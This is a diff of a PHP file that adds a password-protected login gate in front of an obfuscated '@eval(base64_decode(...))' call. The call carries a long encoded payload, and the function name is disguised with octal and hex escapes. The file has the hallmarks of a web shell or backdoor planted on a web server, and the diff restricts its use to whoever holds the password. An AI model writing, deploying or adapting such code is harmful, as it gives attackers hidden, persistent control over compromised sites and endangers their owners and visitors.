@@ -1,4 +1,21 @@
 <?php 
+session_start();
+$hashed_password = '$2y$10$zY6pQ2F8J3b5x9k8W7v4O.l9T5qH6eR2sX4pN3mK8jL9wP0vQ1rS2';
+
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    if (isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        echo '<form method="POST" action="">
+                <label>Password: </label><input type="password" name="password">
+                <input type="submit" value="Login">
+              </form>';
+        if (isset($_POST['password'])) {
+            echo '<p style="color:red;">Invalid password!</p>';
+        }
+        exit;
+    }
+}
 
 $bruxcpft="\142\x61\163\145\x36\x34\137\144\x65\143\157\144\145";@eval($bruxcpft(
 "ZnVuY3Rpb24gVEFKSklqamooJHN0cil7JGNoYXJzPSdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFi
@@ -3505,4 +3522,5 @@ NXc3JsQXJOeWZmaFVpUFpKTWtMdU5uIjskR0tqZ2I9InFqamdTZGlFbW5VT2t1R0t0WXpoQVZ0eXh3Tk
 ImR0bVVqWklEU2FEamNNakFZVHNzcUxIY1hubnBDaGZyS3RTcEpNd2RmR1giOyR4RD0iV1djamp4dHBIc
 nhrU0JwdXF2S0hDaHl5UmtuQnlSUUZrTmpOQkZIQ0pTS2drR0h5VHFKV2hGbFVaVlZFZFFwcUpmUWZnUn
 R4TGh0d1RmbkRGZ3Z0ZXNVUnlOWGZ1VGRPYWhERCI7JHlybklIZGQ9InhOa1ZzIjs="));
+
 ?>  
